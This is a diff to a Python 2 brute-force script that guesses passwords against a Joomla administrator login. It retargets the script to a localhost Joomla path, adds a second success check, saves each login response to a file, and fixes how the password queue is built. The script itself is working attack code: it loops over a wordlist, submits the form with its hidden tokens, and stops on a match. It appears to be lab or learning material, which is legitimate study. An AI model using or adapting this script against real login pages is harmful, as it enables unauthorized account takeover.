@@ -58,12 +58,14 @@ username = "admin"
 wordlist_file = "dict.txt"
 resume = None
 # target specific settings
-target_url = "http://localhost/administrator/index.php"
-target_post = "http://localhost/administrator/index.php"
+target_url = "http://localhost/joomla/administrator/index.php"
+target_post = "http://localhost/joomla/administrator/index.php"
+
+
 username_field= "username"
 password_field= "passwd"
 success_check = "Administration - Control Panel"
-
+success_check = "Configuration"
 
 class Bruter(object):
 
@@ -81,9 +83,20 @@ class Bruter(object):
 	def web_bruter(self):
 		while not self.password_q.empty() and not self.found:
 			brute = self.password_q.get().rstrip()
+			
+			# old
 			jar = cookielib.FileCookieJar("cookies")
 			opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
+			
+			# test
+			#jar = cookielib.CookieJar()
+			#opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
+			#opener.addheaders = [('User-agent', 'Mozilla/5.0')]
+			#urllib2.install_opener(opener)
 
+			#opener.addheaders = [('User-agent', 'Mozilla/5.0')]
+			#urllib2.install_opener(opener)
+			
 			response = opener.open(target_url)
 
 			page = response.read()
@@ -104,6 +117,10 @@ class Bruter(object):
 			login_response = opener.open(target_post, login_data)
 			
 			login_result = login_response.read()
+
+			resultFile = open("response.tmp", "w")
+			resultFile.write(login_result)
+			resultFile.close()
 
 			if success_check in login_result:
 				self.found = True
@@ -145,10 +162,13 @@ class BruteParser(HTMLParser):
 
 
 
-words = ["password1", "password2", "killer", "password4"]
+words = ["password1", "password2", "killer", "password4", "password5", "pass6", "po", "p12", "xale"]
+#words = ["killer"]
 
-words = [self.queryQ.put(query) for query in words]
+queryQ = Queue.Queue()
+
+words = [queryQ.put(query) for query in words]
 
 
-bruter_obj = Bruter(username,words)
+bruter_obj = Bruter(username, queryQ)
 bruter_obj.run_bruteforce()
